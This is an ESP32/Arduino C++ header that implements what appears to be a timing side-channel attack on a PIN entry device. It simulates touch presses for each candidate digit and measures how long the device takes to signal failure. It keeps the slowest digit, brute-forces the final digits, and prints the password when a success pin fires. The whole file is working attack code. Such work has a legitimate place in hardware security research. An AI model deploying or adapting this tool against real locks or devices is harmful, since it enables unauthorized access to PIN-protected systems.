#pragma once

#include <Arduino.h>
#include <Wire.h> 
#include "touchHandle.h"
#include "StopWatch.h"

#define PASS_SIZE 4 // here, change the PASS_SIZE 
#define FAIL_PIN GPIO_NUM_27
#define FAIL_PIN2 12
#define SUCCESS_PIN 14
#define NUM_OF_ATTEMPTS_FOR_DIGIT 30

namespace TSCA {
    typedef enum {NOTHING, FINISHED_BATCH, SUCCESS, FAIL, INC, FOUND_I2C} EventType_t;
    EventType_t eventState = NOTHING;

    const uint8_t NUM_OF_BRUTEFORCE_DIGITS = round(log10((NUM_OF_ATTEMPTS_FOR_DIGIT*2)/log(10))+1);
    const uint32_t NUM_OF_BRUTEFORCE_ITERAIONS = pow(10, NUM_OF_BRUTEFORCE_DIGITS);
    const uint32_t NUM_OF_ITERATIONS = NUM_OF_BRUTEFORCE_ITERAIONS + (NUM_OF_ATTEMPTS_FOR_DIGIT * (PASS_SIZE-NUM_OF_BRUTEFORCE_DIGITS) * 10);
    const float PROGRESS_INTERVAL = 100.0 / NUM_OF_ITERATIONS;

    float progress = 0;

    TaskHandle_t tftTaskHandle = NULL;

    uint64_t sendPassword(uint8_t* password);

    void theEnd();

    uint8_t pass[PASS_SIZE];

    void TSCALoop(void* arg) {
        pinMode(FAIL_PIN, INPUT);
        pinMode(SUCCESS_PIN, INPUT);
        
        // Attach interrupts
        attachInterrupt(digitalPinToInterrupt(FAIL_PIN), StopWatch::stopTimer, RISING);
        attachInterrupt(digitalPinToInterrupt(SUCCESS_PIN), theEnd, RISING);

        delay(10);

        // Initialize the timer
        StopWatch::init();

        ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
        eventState = NOTHING;
        delay(10);
        log_d("reseting the password");
        Touch::reset();
        Touch::relaese();
        delay(1500);
        if (tftTaskHandle != NULL) {
            eventState = FOUND_I2C;
            xTaskNotifyGive(tftTaskHandle);
        }
        const uint8_t initPass[PASS_SIZE] = {0,0,0,0};
        // generate the password each loop iteration
        for(;;){
            memcpy(pass, initPass, PASS_SIZE);
            uint8_t index = 0;
            for (; index < PASS_SIZE-NUM_OF_BRUTEFORCE_DIGITS; index++)
            {
                uint16_t maxes[10] = {0,0,0,0,0,0,0,0,0,0};
                uint64_t results[10] = {0,0,0,0,0,0,0,0,0,0};
                for (uint32_t i = 0; i < NUM_OF_ATTEMPTS_FOR_DIGIT; i++){
                    uint64_t max_time = 0;
                    for (uint8_t j = 0; j < 10; j++)
                    {
                        pass[index] = j;
                        results[j] = sendPassword(pass);
                        if(results[j] > max_time)
                            max_time = results[j];
                        progress += PROGRESS_INTERVAL;
                        if (tftTaskHandle != NULL) {
                            TSCA::eventState = INC;
                            xTaskNotifyGive(tftTaskHandle);
                        }
                        /*for (int i = 0; i < 10; i++) {
                            Serial.print(results[i]);
                            Serial.print(" ");
                        }
                        Serial.println();*/
                    }
                    for (uint8_t j = 0; j < 10; j++)
                        if(results[j] == max_time)
                            maxes[j]++;
                }
                for (int i = 0; i < 10; i++) {
                    Serial.print(maxes[i]);
                    Serial.print(" ");
                }
                Serial.println();
                for (int i = 0; i < 10; i++) {
                    Serial.print(results[i]);
                    Serial.print(" ");
                }
                Serial.println();
                
                uint16_t max = 0;
                uint16_t maxval = 0;
                for (uint8_t j = 0; j < 10; j++)
                    if(maxes[j] > maxval){
                        max = j;
                        maxval = maxes[j];
                    }
                pass[index] = max;
                if (tftTaskHandle != NULL) {
                    TSCA::eventState = FINISHED_BATCH;
                    xTaskNotifyGive(tftTaskHandle);
                }
            }
            for (uint32_t j = 0; j < NUM_OF_BRUTEFORCE_ITERAIONS; j++)
            {
                uint32_t divider = 1;
                for (uint32_t i = 0; i < NUM_OF_BRUTEFORCE_DIGITS; i++){
                    pass[index+i] = ((uint32_t)(j/divider)) % 10;
                    divider *= 10;
                }
                sendPassword(pass);
                progress += PROGRESS_INTERVAL;
                if (tftTaskHandle != NULL) {
                    TSCA::eventState = INC;
                    xTaskNotifyGive(tftTaskHandle);
                }
            }
            progress = 0;
            if (tftTaskHandle != NULL) {
                TSCA::eventState = FAIL;
                xTaskNotifyGive(tftTaskHandle);
            }
        }
    }

    //================================================================================================

    uint64_t sendPassword(uint8_t* password)
    {
        for (uint8_t i = 0; i < PASS_SIZE; i++){
            Touch::touch(password[i]);
            Touch::relaese();
        }

        Touch::enter();

        return StopWatch::wait();
    }

    void theEnd() {
        if (Touch::state == ENTER_BUTTON) {
            detachInterrupt(SUCCESS_PIN);
            detachInterrupt(FAIL_PIN);
            Serial.println("The End");
            TSCA::eventState = SUCCESS;
            xTaskNotifyGive(tftTaskHandle);
            for (size_t i = 0; i < PASS_SIZE; i++) {
                Serial.print(pass[i]);
            }
            vTaskDelete(NULL);
        }
    }
}